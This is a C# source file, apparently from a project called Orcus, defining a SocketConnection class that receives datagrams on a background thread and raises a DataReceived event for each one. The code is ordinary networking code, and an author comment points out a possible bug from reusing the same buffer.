using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Orcus.Administration.Commands.ConnectionInitializer.Connections
{
    public class SocketConnection : IConnection
    {
        private readonly Socket _socket;
        private bool _isDisposed;

        public SocketConnection(Socket socket)
        {
            _socket = socket;
            new Thread(ReceiveData) {IsBackground = true}.Start();
        }

        public event EventHandler<DataReceivedEventArgs> DataReceived;

        private void ReceiveData()
        {
            const int MaxUDPSize = 0x10000;
            byte[] buffer = new byte[MaxUDPSize];

            EndPoint tempRemoteEP;
            if (_socket.AddressFamily == AddressFamily.InterNetwork)
            {
                tempRemoteEP = new IPEndPoint(IPAddress.Any, IPEndPoint.MinPort); //AnyPort, IPEndPoint.Any
            }
            else
            {
                tempRemoteEP = new IPEndPoint(IPAddress.IPv6Any, IPEndPoint.MinPort); //IPEndPoint.IPv6Any
            }

            while (!_isDisposed)
            {
                int length;
                try
                {
                    //May break because the same buffer is always used and passed as event args
                    length = _socket.ReceiveFrom(buffer, MaxUDPSize, 0, ref tempRemoteEP);
                }
                catch (Exception)
                {
                    continue;
                }

                if (length == 0)
                    continue;

                //important to improve non package dropping
                Task.Run(() => DataReceived?.Invoke(this, new DataReceivedEventArgs(buffer, 0, length)));
            }
        }

        public void Dispose()
        {
            _isDisposed = true;
            _socket.Dispose();
        }
    }
}